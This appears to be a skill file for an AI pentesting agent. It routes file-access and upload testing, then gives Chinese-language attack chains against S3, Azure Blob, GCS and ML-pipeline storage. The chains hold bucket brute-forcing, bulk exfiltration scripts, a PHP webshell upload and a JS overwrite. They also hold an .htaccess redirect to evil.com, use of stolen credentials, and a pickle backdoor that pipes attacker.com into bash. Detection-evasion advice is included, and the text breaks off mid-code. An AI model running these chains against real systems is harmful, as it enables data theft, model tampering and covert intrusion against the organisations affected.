---
name: file-access-vuln
description: >-
  Entry P1 category router for file access and upload workflows. Use when
  testing download endpoints, file paths, local file inclusion, upload flows,
  preview pipelines, archive extraction, or storage and sharing boundaries.
---

# File Access Router

This is the routing entry point for filesystem paths, download endpoints, upload pipelines, and file preview handling.

## When to Use

- Parameters, filenames, download endpoints, or import flows influence file paths
- The target supports upload, preview, transcoding, extraction, sharing, download, or proxied file access
- You need to decide whether this is path traversal/LFI or an upload-validation/processing-chain issue

## Skill Map

- [Path Traversal LFI](../path-traversal-lfi/SKILL.md): path traversal, file read, wrapper abuse, include chains

## Upload Workflow Focus

For upload-centric cases, split the workflow into four stages before choosing a deeper skill:

1. Accept: extension, MIME, magic bytes, rename, and filename normalization
2. Store: final path, tenant isolation, overwrite behavior, and direct object URLs
3. Process: image/document/archive/XML converters, preview jobs, and extraction steps
4. Serve: inline render, forced download, sharing, and cache/CDN exposure

Then pivot as needed:

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md): inline render, filename reflection, SVG/HTML execution
- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md): SVG, OOXML, XML import, or preview parsing
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md): converters, media pipelines, or helper binaries shell out
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md): quota, approval, replace, and cross-tenant storage rules

### 2026 新增攻击面路由

- [Cloud Security Audit](../cloud-security-audit/SKILL.md): S3/OSS预签名URL滥用、云存储权限错误、Lambda文件处理 (2026)
- [Container Security Testing](../container-security-testing/SKILL.md): CVE-2026-32193 AKS逃逸、容器卷挂载路径遍历、K8s ConfigMap泄露 (2026)
- [AI/LLM Attack Surface](../ai-llm-attack-surface/SKILL.md): RAG文档注入管道、AI文档解析器XXE、模型文件RCE载体(SGLang/PyTorch) (2026)
- [Telegram Mini App & Bot Security](../telegram-mini-app-bot-security/SKILL.md): CloudStorage API越权、WebView文件下载注入、Bot文件上传RCE、Telegram缓存文件泄露 (2026)

## Recommended Flow

1. First identify whether the entry point is a path parameter, download endpoint, or upload workflow
2. Then locate whether the issue appears in accept, store, process, or serve stages
3. For upload workflows, use the stage map above and pivot into the specific exploit category that matches the observed behavior
4. Small path-chain and upload-bypass samples are merged into the main topic skills; no separate payload entry is needed

## Related Categories

- [injection-checking](../injection-checking/SKILL.md)
- [business-logic-vuln](../business-logic-vuln/SKILL.md)

---

## PRACTICAL ATTACK CHAINS (2026)

> 本节提供完整、可立即使用的实战攻击链，每条链包含真实命令、分步利用过程、检测绕过技术与 2026 CVE 引用。所有代码注释均为中文。聚焦云存储配置错误导致的数据泄露与 AI 管道中的制品安全。

---

### 攻击链 1：AWS S3 存储桶配置错误到全量数据窃取

**场景**：目标组织的 S3 存储桶配置了过于宽松的访问策略（如 `"Principal": "*"` 允许匿名访问，或 bucket ACL 设置为 public-read）。攻击者通过枚举发现可匿名访问的存储桶，逐步列举并下载所有敏感数据，包括用户上传文件、数据库备份、应用配置和凭证。

**前置条件**：
- S3 存储桶存在配置错误（公开读取权限、过宽的 bucket policy）
- 存储桶名称可猜测或可通过信息收集发现
- 存储桶未启用 Block Public Access

**分步利用**：

```bash
# === 步骤 1：信息收集 - 发现目标 S3 存储桶名称 ===
# 方法 A：从目标网站源码/JS 文件中提取 S3 URL
curl -s "http://target.com/" | grep -oP 'https?://[a-zA-Z0-9-]+\.s3[a-z.-]*\.amazonaws\.com'
curl -s "http://target.com/" | grep -oP '[a-zA-Z0-9-]+\.s3\.amazonaws\.com'
curl -s "http://target.com/assets/app.js" | grep -oP 's3[a-z.-]*\.amazonaws\.com/[a-zA-Z0-9-]+'

# 方法 B：从 DNS 记录中发现 CNAME 指向 S3
dig target.com ANY | grep -i "cname\|s3"

# 方法 C：基于公司名/域名猜测存储桶名称
# 常见命名模式：{company}-{env}, {company}-backup, {company}-uploads, {company}-media
python3 -c "
import requests

# 目标域名
domain = 'target.com'
company = 'target'

# 生成可能的 bucket 名称
bucket_names = [
    f'{company}',
    f'{company}-prod',
    f'{company}-staging',
    f'{company}-dev',
    f'{company}-backup',
    f'{company}-backups',
    f'{company}-uploads',
    f'{company}-media',
    f'{company}-files',
    f'{company}-data',
    f'{company}-assets',
    f'{company}-documents',
    f'{company}-images',
    f'{company}-static',
    f'{company}-logs',
    f'{company}-config',
    f'{domain.replace(\".\",\"-\")}',
    f'{domain.replace(\".\",\"-\")}-backup',
]

for bucket in bucket_names:
    # 测试 bucket 是否存在且可匿名访问
    url = f'https://{bucket}.s3.amazonaws.com'
    r = requests.get(url, timeout=5)
    if r.status_code == 200:
        print(f'[+] 可匿名列举的 bucket: {bucket}')
        print(f'    URL: {url}')
    elif r.status_code == 403:
        print(f'[*] bucket 存在但拒绝匿名访问: {bucket}')
    # 404 = bucket 不存在
"

# === 步骤 2：列举存储桶内容 ===
# 发现可访问的 bucket 后，列举所有对象
BUCKET="target-uploads"

# 方法 A：使用 curl 列举
curl -s "https://${BUCKET}.s3.amazonaws.com/" | python3 -m xml.tool

# 方法 B：使用 awscli 列举（匿名方式）
aws s3 ls s3://${BUCKET}/ --no-sign-request

# 递归列举所有对象（包括子目录）
aws s3 ls s3://${BUCKET}/ --recursive --no-sign-request

# === 步骤 3：下载高价值文件 ===
# 下载单个文件
aws s3 cp s3://${BUCKET}/config/database.yml ./exfil/ --no-sign-request
aws s3 cp s3://${BUCKET}/.env ./exfil/ --no-sign-request
aws s3 cp s3://${BUCKET}/backup/db_backup.sql ./exfil/ --no-sign-request

# 批量下载所有文件
aws s3 sync s3://${BUCKET}/ ./exfil/${BUCKET}/ --no-sign-request

# 下载特定前缀下的文件（如所有用户上传）
aws s3 sync s3://${BUCKET}/uploads/ ./exfil/${BUCKET}/uploads/ --no-sign-request

# === 步骤 4：发现敏感文件 ===
# 搜索常见敏感文件名
python3 -c "
import subprocess
import re

bucket = 'target-uploads'
# 列举所有对象
result = subprocess.run(
    ['aws', 's3', 'ls', f's3://{bucket}/', '--recursive', '--no-sign-request'],
    capture_output=True, text=True
)

# 敏感文件模式
sensitive_patterns = [
    r'\.env$',
    r'\.pem$',
    r'\.key$',
    r'\.pfx$',
    r'id_rsa',
    r'credentials',
    r'\.sql$',
    r'\.bak$',
    r'\.backup$',
    r'config\.(yml|yaml|json|xml|ini|conf|properties)$',
    r'\.kube/config',
    r'\.aws/credentials',
    r'token',
    r'secret',
    r'password',
]

for line in result.stdout.split('\n'):
    for pattern in sensitive_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            print(f'[!] 敏感文件: {line}')
            break
"

# === 步骤 5：利用 S3 版本控制获取已删除文件 ===
# 如果 bucket 启用了版本控制，已"删除"的文件仍可通过版本 ID 访问
# 列举所有版本（包括删除标记）
aws s3api list-object-versions --bucket ${BUCKET} --no-sign-request | python3 -m json.tool

# 下载特定版本
aws s3api get-object --bucket ${BUCKET} --key "config/database.yml" --version-id "VERSION_ID" ./exfil/database_v1.yml --no-sign-request

# === 步骤 6：写入权限利用（如果 bucket 允许匿名写入）===
# 测试是否可以上传文件
echo "test" > test.txt
aws s3 cp test.txt s3://${BUCKET}/test_write.txt --no-sign-request

# 如果上传成功 → 可进行以下攻击：
# 攻击 A：覆盖现有文件（如替换 JS 文件注入恶意代码）
aws s3 cp malicious.js s3://${BUCKET}/assets/app.js --no-sign-request

# 攻击 B：上传 webshell（如果 bucket 同时作为网站托管）
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws s3 cp shell.php s3://${BUCKET}/shell.php --no-sign-request

# 攻击 C：上传 .htaccess 劫持路由
echo 'Redirect 301 / https://evil.com/' > .htaccess
aws s3 cp .htaccess s3://${BUCKET}/.htaccess --no-sign-request

# === 步骤 7：利用 S3 网站端点 SSRF ===
# 如果 bucket 配置为静态网站托管
# http://bucket-name.s3-website-region.amazonaws.com/
curl -s "http://${BUCKET}.s3-website-us-east-1.amazonaws.com/"

# 检查是否可利用 S3 作为 SSRF 跳板
# S3 网站端点可能不验证 Host 头，可用于 SSRF
curl -s -H "Host: ${BUCKET}.s3.amazonaws.com" "http://internal-service/"

# === 步骤 8：自动化 S3 存储桶安全审计 ===
python3 -c "
import boto3
import botocore

def audit_s3_bucket(bucket_name):
    '''审计 S3 存储桶安全配置'''
    # 匿名客户端（不使用凭证）
    s3 = boto3.client('s3', config=botocore.config.Config(signature_version=botocore.UNSIGNED))
    
    findings = []
    
    # 检查 1：是否可匿名列举
    try:
        s3.list_objects_v2(Bucket=bucket_name, MaxKeys=1)
        findings.append('[!] 可匿名列举 bucket 内容')
    except botocore.exceptions.ClientError as e:
        if 'Access Denied' in str(e):
            pass  # 安全
        elif 'NoSuchBucket' in str(e):
            return ['bucket 不存在']
    
    # 检查 2：是否可匿名上传
    try:
        s3.put_object(Bucket=bucket_name, Key='audit_test', Body=b'test')
        findings.append('[!] 可匿名上传文件到 bucket')
        # 清理测试文件
        s3.delete_object(Bucket=bucket_name, Key='audit_test')
    except:
        pass
    
    # 检查 3：列举所有对象并识别敏感文件
    try:
        paginator = s3.get_paginator('list_objects_v2')
        for page in paginator.paginate(Bucket=bucket_name):
            for obj in page.get('Contents', []):
                key = obj['Key']
                if any(s in key.lower() for s in ['.env', '.pem', '.key', 'credential', 'password', '.sql', 'backup']):
                    findings.append(f'[!] 敏感文件: {key} (大小: {obj[\"Size\"]} bytes)')
    except:
        pass
    
    return findings if findings else ['bucket 配置安全（匿名访问被拒绝）']

# 审计目标 bucket
results = audit_s3_bucket('target-uploads')
for r in results:
    print(r)
"
```

**检测绕过技术**：
- Bucket 启用了日志记录 → 使用不同的 IP/地区访问，分散在时间维度上避免触发告警
- Bucket 配置了 Block Public Access → 尝试通过应用层的预签名 URL 或 IAM 角色链获取访问权限
- CloudTrail 记录 API 调用 → 使用 HTTP REST API 而非 awscli（部分日志依赖 SDK 调用模式）
- S3 Object Lambda 拦截 → 直接访问底层 S3 endpoint 绕过 Lambda 转换层

---

### 攻击链 2：Azure Blob 存储匿名访问利用

**场景**：目标组织使用 Azure Blob Storage 存储文件，部分容器（container）配置了匿名访问级别为 "Blob" 或 "Container"，允许未经认证的用户读取 blob 内容或列举容器内文件。攻击者发现匿名访问入口后，枚举容器并下载敏感数据。

**前置条件**：
- Azure Blob 存储容器配置了匿名访问（Blob 级别或 Container 级别）
- 存储账户名称可发现
- 容器名称可猜测或可通过信息收集获得

**分步利用**：

```bash
# === 步骤 1：发现 Azure 存储账户 ===
# 方法 A：从目标网站源码中提取 Azure Blob URL
# Azure Blob URL 格式: https://{account}.blob.core.windows.net/{container}/{blob}
curl -s "http://target.com/" | grep -oP 'https?://[a-zA-Z0-9]+\.blob\.core\.windows\.net'
curl -s "http://target.com/assets/app.js" | grep -oP 'blob\.core\.windows\.net/[a-zA-Z0-9-]+'

# 方法 B：基于公司名猜测存储账户名称
python3 -c "
import requests

company = 'target'
# Azure 存储账户名称规则：3-24 字符，仅小写字母和数字
account_names = [
    f'{company}',
    f'{company}storage',
    f'{company}data',
    f'{company}media',
    f'{company}files',
    f'{company}backup',
    f'{company}prod',
    f'{company}staging',
    f'{company}dev',
]

for account in account_names:
    url = f'https://{account}.blob.core.windows.net/'
    r = requests.get(url, timeout=5)
    if r.status_code != 404:
        print(f'[+] 发现存储账户: {account}')
        print(f'    URL: {url}')
        print(f'    状态码: {r.status_code}')
"

# === 步骤 2：枚举容器 ===
ACCOUNT="targetstorage"

# 尝试列举容器（需要 Container 级别匿名访问）
curl -s "https://${ACCOUNT}.blob.core.windows.net/?comp=list" | python3 -m xml.tool

# 常见容器名称
python3 -c "
import requests

account = 'targetstorage'
# 常见容器名称
container_names = [
    'public', 'uploads', 'files', 'media', 'images', 'documents',
    'backup', 'backups', 'data', 'assets', 'static', 'content',
    'photos', 'videos', 'logs', 'config', 'temp', 'shared',
    'user-uploads', 'profile-images', 'attachments', 'exports',
    '\$web',  # Azure 静态网站托管容器
    '\$logs',  # Azure 存储日志容器
]

for container in container_names:
    # 测试容器是否存在且可匿名访问
    url = f'https://{account}.blob.core.windows.net/{container}?restype=container&comp=list'
    r = requests.get(url, timeout=5)
    if r.status_code == 200 and 'Blob' in r.text:
        print(f'[+] 可匿名访问的容器: {container}')
    elif r.status_code == 403:
        print(f'[*] 容器存在但拒绝匿名访问: {container}')
"

# === 步骤 3：列举容器内 blob 并下载 ===
CONTAINER="uploads"

# 列举容器内所有 blob
curl -s "https://${ACCOUNT}.blob.core.windows.net/${CONTAINER}?restype=container&comp=list" | python3 -m xml.tool

# 使用 Azure CLI 列举（匿名方式）
az storage blob list --account-name ${ACCOUNT} --container-name ${CONTAINER} --auth-mode login

# 下载特定 blob
curl -s -o ./exfil/config.yml "https://${ACCOUNT}.blob.core.windows.net/${CONTAINER}/config/database.yml"

# 批量下载
az storage blob download-batch --account-name ${ACCOUNT} --source ${CONTAINER} --destination ./exfil/ --auth-mode login

# === 步骤 4：利用 SAS Token 泄露 ===
# 如果在 URL 中发现 SAS token（共享访问签名）
# SAS URL 格式: https://account.blob.core.windows.net/container/blob?sv=...&sig=...

# 从目标网站提取 SAS token
curl -s "http://target.com/" | grep -oP 'sv=[^"]*sig=[^"&]*'

# 使用泄露的 SAS token 访问受限容器
SAS_TOKEN="?sv=2024-01-01&ss=b&srt=co&sp=rl&sig=LEAKED_SIGNATURE"
curl -s "https://${ACCOUNT}.blob.core.windows.net/${CONTAINER}${SAS_TOKEN}&restype=container&comp=list"

# SAS token 可能权限过宽，尝试列举所有容器
curl -s "https://${ACCOUNT}.blob.core.windows.net/?comp=list${SAS_TOKEN}" | python3 -m xml.tool

# === 步骤 5：利用 Azure 存储账户密钥泄露 ===
# 如果在配置文件或环境变量中发现存储账户密钥
# ACCOUNT_KEY 在 connection string 中: DefaultEndpointsProtocol=https;AccountName=xxx;AccountKey=yyy

# 使用账户密钥访问
az storage blob list --account-name ${ACCOUNT} --account-key "LEAKED_ACCOUNT_KEY" --container-name ${CONTAINER}

# 列举所有容器
az storage container list --account-name ${ACCOUNT} --account-key "LEAKED_ACCOUNT_KEY"

# 下载所有数据
az storage blob download-batch --account-name ${ACCOUNT} --account-key "LEAKED_ACCOUNT_KEY" --source ${CONTAINER} --destination ./exfil/

# === 步骤 6：跨容器遍历 ===
# 如果 SAS token 签名基于存储账户级别（srt=co 包含 container 和 object）
# 攻击者可访问该账户下的所有容器
python3 -c "
import requests
from xml.etree import ElementTree

account = 'targetstorage'
sas_token = '?sv=2024-01-01&ss=b&srt=co&sp=rl&sig=LEAKED_SIGNATURE'

# 列举所有容器
r = requests.get(f'https://{account}.blob.core.windows.net/?comp=list{sas_token}')
root = ElementTree.fromstring(r.content)

containers = [elem.text for elem in root.iter('Name')]
print(f'[*] 发现 {len(containers)} 个容器: {containers}')

# 遍历每个容器，下载所有 blob
for container in containers:
    r = requests.get(f'https://{account}.blob.core.windows.net/{container}?restype=container&comp=list{sas_token}')
    root = ElementTree.fromstring(r.content)
    blobs = [elem.text for elem in root.iter('Name')]
    print(f'[*] 容器 {container} 包含 {len(blobs)} 个 blob')
    for blob in blobs[:5]:  # 显示前5个
        print(f'    - {blob}')
"
```

**检测绕过技术**：
- Azure Monitor 检测匿名访问 → 使用不同地区 IP，分散请求频率
- 容器级别匿名访问被禁用但 SAS token 可用 → 利用泄露的 SAS token 访问受限容器
- SAS token 权限校验 → 检查 SAS token 的 `srt`（资源类型）和 `sp`（权限）参数，寻找权限过宽的 token
- 存储账户防火墙限制 → 通过同区域的 Azure 服务（如 Azure Functions）作为代理访问

---

### 攻击链 3：Google Cloud Storage 存储桶枚举

**场景**：目标组织使用 Google Cloud Storage (GCS) 存储数据，部分存储桶配置了公开读取权限（allUsers 或 allAuthenticatedUsers 角色）。攻击者通过枚举发现公开存储桶，利用 GCS 的特性（如对象版本控制、对象保留策略）获取敏感数据。

**前置条件**：
- GCS 存储桶配置了公开访问权限
- 存储桶名称可发现或可猜测
- 未启用 Uniform Bucket-Level Access 限制

**分步利用**：

```bash
# === 步骤 1：发现 GCS 存储桶 ===
# GCS URL 格式: https://storage.googleapis.com/{bucket}/{object}
# 或: https://{bucket}.storage.googleapis.com/{object}

# 从目标网站提取 GCS URL
curl -s "http://target.com/" | grep -oP 'storage\.googleapis\.com/[a-zA-Z0-9-]+'
curl -s "http://target.com/" | grep -oP '[a-zA-Z0-9-]+\.storage\.googleapis\.com'

# 基于域名/公司名猜测存储桶名称
# GCS 存储桶名称全局唯一，命名通常包含公司名
python3 -c "
import requests

company = 'target'
domain = 'target.com'

bucket_names = [
    f'{company}',
    f'{company}-storage',
    f'{company}-data',
    f'{company}-media',
    f'{company}-uploads',
    f'{company}-backup',
    f'{company}-backups',
    f'{company}-files',
    f'{company}-assets',
    f'{company}-static',
    f'{company}-images',
    f'{company}-documents',
    f'{company}-logs',
    f'{company}-prod',
    f'{company}-staging',
    f'{company}.appspot.com',  # Firebase 存储
    f'{domain.replace(\".\",\"-\")}',
]

for bucket in bucket_names:
    url = f'https://storage.googleapis.com/{bucket}'
    r = requests.get(url, timeout=5)
    if r.status_code in [200, 403]:
        print(f'[+] bucket 存在: {bucket} (状态码: {r.status_code})')
    # 200 = 可匿名列举; 403 = 存在但拒绝匿名访问
"

# === 步骤 2：列举存储桶内容 ===
BUCKET="target-uploads"

# 方法 A：使用 REST API 列举
curl -s "https://storage.googleapis.com/storage/v1/b/${BUCKET}/o" | python3 -m json.tool

# 方法 B：使用 gsutil 列举
gsutil ls gs://${BUCKET}/

# 递归列举所有对象
gsutil ls -r gs://${BUCKET}/**

# === 步骤 3：下载对象 ===
# 下载单个对象
curl -s -o ./exfil/config.yml "https://storage.googleapis.com/${BUCKET}/config/database.yml"

# 使用 gsutil 下载
gsutil cp gs://${BUCKET}/config/database.yml ./exfil/

# 批量下载
gsutil -m cp -r gs://${BUCKET}/** ./exfil/${BUCKET}/

# === 步骤 4：利用对象版本控制获取已删除文件 ===
# 如果存储桶启用了版本控制，已"删除"的对象仍可访问
gsutil versioning get gs://${BUCKET}

# 列举所有版本（包括已删除的）
gsutil ls -a gs://${BUCKET}/**

# 下载特定版本（使用 generation 编号）
gsutil cp gs://${BUCKET}/config/database.yml#1234567890 ./exfil/database_v1.yml

# === 步骤 5：利用 GCS HMAC 密钥泄露 ===
# 如果在配置中发现 HMAC 密钥（access_id + secret）
# GCS HMAC 兼容 AWS S3 API，可使用 awscli 访问

# 配置 AWS CLI 使用 GCS HMAC 凭证
aws configure set aws_access_key_id "GOOGLE_HMAC_ACCESS_ID"
aws configure set aws_secret_access_key "GOOGLE_HMAC_SECRET"
aws configure set s3.endpoint_url "https://storage.googleapis.com"

# 使用 S3 兼容 API 访问 GCS
aws s3 ls --endpoint-url https://storage.googleapis.com
aws s3 sync s3://${BUCKET}/ ./exfil/ --endpoint-url https://storage.googleapis.com

# === 步骤 6：利用 Firebase Storage 配置错误 ===
# Firebase Storage 底层使用 GCS，但配置可能更宽松
# Firebase 存储 URL 格式: https://firebasestorage.googleapis.com/v0/b/{bucket}/o/{object}

# 测试 Firebase Storage 公开访问
curl -s "https://firebasestorage.googleapis.com/v0/b/${BUCKET}/o" | python3 -m json.tool

# 下载 Firebase Storage 对象
curl -s "https://firebasestorage.googleapis.com/v0/b/${BUCKET}/o/config%2Fdatabase.yml?alt=media" -o ./exfil/database.yml

# === 步骤 7：自动化 GCS 枚举与审计 ===
python3 -c "
import requests
import json

def enumerate_gcs_bucket(bucket_name):
    '''枚举 GCS 存储桶'''
    findings = []
    
    # 检查 bucket 是否存在且可访问
    url = f'https://storage.googleapis.com/storage/v1/b/{bucket_name}'
    r = requests.get(url, timeout=5)
    
    if r.status_code == 404:
        return ['bucket 不存在']
    elif r.status_code == 403:
        return ['bucket 存在但拒绝匿名访问']
    elif r.status_code == 200:
        info = r.json()
        findings.append(f'[+] bucket 可匿名访问: {bucket_name}')
        findings.append(f'    位置: {info.get(\"location\", \"unknown\")}')
        findings.append(f'    创建时间: {info.get(\"timeCreated\", \"unknown\")}')
        findings.append(f'    版本控制: {info.get(\"versioning\", {}).get(\"enabled\", False)}')
        
        # 列举对象
        list_url = f'https://storage.googleapis.com/storage/v1/b/{bucket_name}/o?maxResults=1000'
        r = requests.get(list_url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            objects = data.get('items', [])
            findings.append(f'    对象数量: {len(objects)}')
            
            # 识别敏感文件
            for obj in objects:
                name = obj['name']
                if any(s in name.lower() for s in ['.env', '.pem', '.key', 'credential', 'password', '.sql', 'backup', 'config']):
                    findings.append(f'    [!] 敏感文件: {name} ({obj[\"size\"]} bytes)')
    
    return findings

# 枚举目标 bucket
for finding in enumerate_gcs_bucket('target-uploads'):
    print(finding)
"
```

**检测绕过技术**：
- GCS 审计日志记录匿名访问 → 使用 Cloud CDN 或 Signed URL 作为中间层，使访问来源看起来合法
- Uniform Bucket-Level Access 限制 → 利用对象级别的 ACL（如果未启用 UBLA，旧对象可能有公开 ACL）
- 存储桶防火墙限制 → 通过 Google Cloud 服务（如 Cloud Run、Cloud Functions）作为代理
- 对象加密 → 密钥管理服务（KMS）密钥权限与对象权限可能不一致，尝试访问加密对象（返回密文）后破解

---

### 攻击链 4：2026 AI 管道中的云存储模型制品泄露

**场景**：AI/ML 管道通常将训练好的模型、训练数据集、配置文件和实验日志存储在云对象存储中。这些制品包含高价值信息：专有模型权重（知识产权）、训练数据（可能含 PII）、模型架构（商业机密）和凭证。攻击者利用云存储配置错误或 AI 管道的权限设计缺陷，窃取模型制品，甚至通过篡改模型文件实现供应链攻击。

**前置条件**：
- AI 管道使用云存储（S3/GCS/Azure Blob）存储模型制品
- 模型制品的存储路径可预测或可枚举
- 云存储权限配置不当（公开访问或过宽的 IAM 策略）
- 或：AI 管道服务存在路径遍历/SSRF 漏洞可间接访问存储

**分步利用**：

```bash
# === 步骤 1：发现 AI 管道使用的云存储 ===
# AI 管道常见存储路径模式：
# s3://company-ml-models/{project}/{version}/model.pkl
# s3://company-ml-datasets/{dataset_name}/data.parquet
# gs://company-ai-artifacts/experiments/{experiment_id}/

# 从 AI 服务的 API/配置中发现存储路径
curl -s "http://ai-platform.com/api/models" -H "Authorization: Bearer TOKEN" | python3 -m json.tool
# 响应中可能包含 model_uri: s3://company-ml-models/v1/model.pkl

# 从 CI/CD 配置文件中发现存储路径
curl -s "http://github.com/company/ml-pipeline/raw/main/.dvc/config" 
curl -s "http://github.com/company/ml-pipeline/raw/main/configs/training.yaml"

# 从 MLflow/W&B 实验跟踪服务器中获取制品路径
curl -s "http://mlflow.company.com/api/2.0/mlflow/experiments/search" | python3 -m json.tool

# === 步骤 2：枚举模型制品存储桶 ===
# 常见 AI 模型存储桶命名
python3 -c "
import requests

company = 'target'
# AI/ML 相关存储桶名称
ml_bucket_names = [
    f'{company}-ml-models',
    f'{company}-ml-datasets',
    f'{company}-ml-artifacts',
    f'{company}-ai-models',
    f'{company}-ai-artifacts',
    f'{company}-ml-experiments',
    f'{company}-ml-logs',
    f'{company}-model-registry',
    f'{company}-training-data',
    f'{company}-feature-store',
    f'{company}-mlops',
    f'{company}-mlflow',
    f'{company}-wandb',
]

for bucket in ml_bucket_names:
    # 测试 S3
    s3_url = f'https://{bucket}.s3.amazonaws.com/'
    r = requests.get(s3_url, timeout=5)
    if r.status_code == 200:
        print(f'[+] S3 可访问: {bucket}')
    
    # 测试 GCS
    gcs_url = f'https://storage.googleapis.com/storage/v1/b/{bucket}/o?maxResults=10'
    r = requests.get(gcs_url, timeout=5)
    if r.status_code == 200:
        print(f'[+] GCS 可访问: {bucket}')
"

# === 步骤 3：下载模型制品 ===
BUCKET="target-ml-models"

# 列举模型文件
aws s3 ls s3://${BUCKET}/ --recursive --no-sign-request

# 常见模型文件格式及高价值目标
# .pkl / .pickle  → pickle 序列化的模型（可能含 RCE payload）
# .pt / .pth       → PyTorch 模型权重
# .h5              → Keras/TensorFlow 模型
# .onnx            → ONNX 模型
# .gguf            → GGUF 量化模型（LLM）
# .safetensors     → SafeTensors 模型
# .joblib          → scikit-learn 模型
# config.json      → 模型配置（含架构信息）
# tokenizer.json   → 分词器配置

# 下载模型权重（窃取知识产权）
aws s3 cp s3://${BUCKET}/gpt-custom/v1/model.pt ./exfil/ --no-sign-request

# 下载训练数据集（可能含 PII）
aws s3 cp s3://${BUCKET}/datasets/user_data.parquet ./exfil/ --no-sign-request

# 下载训练配置（含超参数、数据路径）
aws s3 cp s3://${BUCKET}/experiments/exp_001/config.yaml ./exfil/ --no-sign-request

# === 步骤 4：从模型制品中提取敏感信息 ===
python3 -c "
import pickle
import json
import os

# 分析下载的模型文件
model_files = [
    'exfil/model.pkl',
    'exfil/config.json',
    'exfil/training_log.json',
]

for mf in model_files:
    if not os.path.exists(mf):
        continue
    
    print(f'\n[*] 分析: {mf}')
    
    if mf.endswith('.pkl'):
        # 使用安全方式加载 pickle（不执行 __reduce__）
        import pickletools
        with open(mf, 'rb') as f:
            # 反汇编 pickle 查看内容，不执行
            pickletools.dis(f)
    
    elif mf.endswith('.json'):
        with open(mf) as f:
            data = json.load(f)
            # 搜索敏感信息
            def search_secrets(obj, path=''):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if any(s in k.lower() for s in ['key', 'secret', 'password', 'token', 'credential']):
                            print(f'  [!] 敏感配置: {path}.{k} = {v}')
                        search_secrets(v, f'{path}.{k}')
                elif isinstance(obj, str):
                    if any(s in obj for s in ['AKIA', 'sk-', 'password=', 'Bearer ']):
                        print(f'  [!] 敏感值: {path} = {obj}')
            search_secrets(data)
    
    elif mf.endswith('.yaml') or mf.endswith('.yml'):
        import yaml
        with open(mf) as f:
            content = f.read()
            # 搜索凭证模式
            import re
            for pattern in [r'password.*:', r'api_key.*:', r'secret.*:', r'token.*:']:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    print(f'  [!] 配置中包含敏感字段: {matches}')
"

# === 步骤 5：篡改模型文件实现供应链攻击 ===
# 如果存储桶允许写入，攻击者可篡改模型文件注入后门
python3 -c "
import pickle
import os
import boto3
from botocore import UNSIGNED
from botocore.config import Config

# 目标 bucket 和模型路径
bucket = 'target-ml-models'
model_key = 'gpt-custom/v1/model.pkl'

# 下载原始模型
s3 = boto3.client('s3', config=Config(signature_version=UNSIGNED))
# 注意：下载需要读取权限

# 构造恶意模型文件（pickle RCE）
class BackdooredModel:
    '''篡改后的模型，加载时执行后门'''
    def __init__(self):
        # 保留原始模型功能
        self.model_type = 'gpt-custom'
        self.version = '1.0'
    
    def __reduce__(self):
        # 加载时静默执行后门命令
        # 1. 下载持久化后门
        # 2. 建立反弹 shell
        cmd = 'curl http://attacker.com/payload | bash # 静默安装后门'
        return (os.system, (cmd,))

# 序列化恶意模型
with open('backdoored_model.pkl', 'wb') as f:
    pickle.dump(BackdooredModel(), f)

print('[+] backdoored_model.pkl 创建成功')
print('[+] 上传到 S3 替换原始模型后，下次加载时触发后门')
print(f'[+] 上传命令: aws s3 cp backdoored_model.pkl s3://{bucket}/{model_key}')
"

# === 步骤 6：利用 AI 管道权限提升 ===
# AI 管道服务（如 SageMaker、Vertex AI、Azure ML）通常使用 IAM 角色访问存储
# 如果获取了管道服务的临时凭证，可直接访问所有授权的存储

# 假设通过 SSRF 获取了 SageMaker 执行角色的临时凭证
export AWS_ACCESS_KEY_ID="ASIA-STOLEN-KEY"
export AWS_SECRET_ACCESS_KEY="STOLEN-SECRET"
export AWS_SESSION_TOKEN="STOLEN-TOKEN"

# 使用窃取的角色凭证列举所有可访问的 bucket
aws s3 ls

# 下载所有模型制品
aws s3 sync s3://target-ml-models/ ./exfil/models/
aws s3 sync s3://target-ml-datasets/ ./exfil/datasets/
aws s3 sync s3://target-ml-artifacts/ ./exfil/artifacts/

# === 步骤 7：利用 HuggingFace Hub 缓存泄露 ===
# AI 管道常从 HuggingFace Hub 下载模型，缓存在本地或云存储中
# 缓存目录可能包含模型文件和访问 token

# 检查 HuggingFace 缓存（如果可访问）
python3 -c "
import os
import json
import glob

# HuggingFace 缓存路径
cache_paths = [
    '~/.cache/huggingface/',
    '/tmp/huggingface/',
    '/root/.cache/huggingface/',
    os.environ.get('HF_HOME', '') + '/hub/',
]

for cache_path in cache_paths:
    cache_path = os.path.expanduser(cache_path)
    if os.path.exists(cache_path):
        print(f'[+] 发现 HuggingFace 缓存: {cache_path}')
        
        # 搜索 token 文件
        for root, dirs, files in os.walk(cache_path):
            for f in files:
                if 'token' in f.lower():
                    fpath = os.path.join(root, f)
                    with open(fpath) as tf:
                        token = tf.read().strip()
                        if token:
                            print(f'  [!] HuggingFace Token: {token[:20]}...')
                
                # 搜索模型配置文件
                if f == 'config.json':
                    fpath = os.path.join(root, f)
                    print(f'  [*] 模型配置: {fpath}')
"

# === 步骤 8：自动化 AI 制品存储审计 ===
python3 -c "
import requests
import json

def audit_ai_storage(bucket_name, cloud='s3'):
    '''审计 AI 制品存储桶'''
    findings = []
    
    if cloud == 's3':
        # 检查匿名访问
        url = f'https://{bucket_name}.s3.amazonaws.com/'
        r = requests.get(url, timeout=10)
        
        if r.status_code == 200:
            # 解析 XML 响应列出对象
            import xml.etree.ElementTree as ET
            root = ET.fromstring(r.content)
            objects = root.findall('.//Key')
            
            # AI 制品敏感文件模式
            ai_patterns = [
                r'\.pkl$', r'\.pickle$', r'\.pt$', r'\.pth$',
                r'\.h5$', r'\.onnx$', r'\.gguf$', r'\.safetensors$',
                r'\.joblib$', r'config\.json$', r'tokenizer',
                r'training_data', r'dataset', r'\.parquet$',
                r'experiment', r'checkpoint',
            ]
            
            import re
            ai_files = []
            for obj in objects:
                key = obj.text
                for pattern in ai_patterns:
                    if re.search(pattern, key, re.IGNORECASE):
                        ai_files.append(key)
                        break
            
            if ai_files:
                findings.append(f'[!] 发现 AI 制品 ({len(ai_files)} 个):')
